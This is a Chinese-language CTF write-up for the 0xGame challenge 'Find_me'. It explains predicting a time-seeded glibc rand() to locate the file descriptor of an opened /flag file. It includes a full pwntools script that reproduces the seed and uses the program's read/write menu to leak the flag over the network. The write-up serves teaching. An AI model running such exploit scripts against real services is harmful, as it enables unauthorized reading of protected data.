# Find_me

## 题目简述

64 位 ELF 无 PIE、无 Canary，NX 开启。程序用当前秒级时间初始化 glibc `rand()`，计算 `rand() % 100`，先连续打开相同数量的 `/fake_flag`，再打开真正的 `/flag`。所有文件都不关闭，因此 flag 的文件描述符为：

```text
3 + rand() % 100
```

后续菜单允许执行两次操作：从任意文件描述符读取 0x50 字节到全局缓冲区，或把该缓冲区写到任意文件描述符。目标是预测 flag fd，先读入缓冲区，再写到标准输出。

## 解题过程

Linux 进程启动时通常已占用 `0/1/2`，分别对应标准输入、标准输出和标准错误，后续 `open()` 会选择最小可用 fd。题目没有关闭前三个描述符，也没有关闭伪 flag 文件，所以公式可以直接成立。

Python 自带的 `random` 与 glibc `rand()` 算法不同，必须调用题目附带的同版本 `libc.so.6`。远端和本机时间可能相差一两秒，脚本按相邻时间戳重连尝试。连接地址从 `HOST`、`PORT` 环境变量读取，避免把已经失效的比赛地址固化到 WP：

```python
import os
import time
from ctypes import CDLL
from pwn import *

HOST = os.environ["HOST"]
PORT = int(os.environ["PORT"])
libc = CDLL("./libc.so.6")

for delta in (0, -1, -2, 1):
    io = remote(HOST, PORT)
    io.recvuntil(b"dolls ?")

    seed = int(time.time()) + delta
    libc.srand(seed)
    flag_fd = 3 + libc.rand() % 100
    log.info(f"seed={seed}, fd={flag_fd}")

    # 操作 0：read(flag_fd, global_buffer, 0x50)
    io.sendline(b"0")
    time.sleep(0.1)
    io.sendline(str(flag_fd).encode())
    time.sleep(0.1)

    # 操作 1：write(1, global_buffer, 0x50)
    io.sendline(b"1")
    time.sleep(0.1)
    io.sendline(b"1")

    data = io.recvall(timeout=2)
    io.close()
    if b"0xGame{" in data:
        print(data.decode(errors="ignore"))
        break
```

短暂等待可以避免多个数字被一次 `read(0, ..., 4)` 合并消费。成功的时间戳会使第一次操作读到 `/flag`，第二次操作把内容发送回连接。题目压缩包只包含程序、加载器和 libc，没有保存比赛实例中的 `/flag` 内容，因此最终字符串以当前服务回显为准。

## 方法总结

- 核心技巧：预测 `srand(time(0))` 生成的随机数，并利用顺序分配的文件描述符定位 flag。
- 识别信号：秒级时间种子、未关闭的连续 `open()`、可控 fd 的 `read`/`write` 原语。
- 复用要点：复现目标使用的同一种 PRNG 和 libc 版本；网络场景应枚举相邻时间戳，并注意短读、粘包和标准 fd 的编号。
